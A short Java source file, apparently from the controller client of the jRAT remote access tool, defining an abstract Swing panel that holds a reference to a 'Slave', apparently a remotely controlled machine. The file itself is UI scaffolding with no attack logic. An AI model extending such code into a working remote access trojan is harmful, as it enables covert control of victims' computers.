package su.jrat.client.ui.panels;

import javax.swing.JPanel;

import su.jrat.client.Slave;


@SuppressWarnings("serial")
public abstract class PanelControlParent extends JPanel {

	public Slave slave;

	public PanelControlParent(Slave slave) {
		setSize(600, 350);
		this.slave = slave;
	}

}
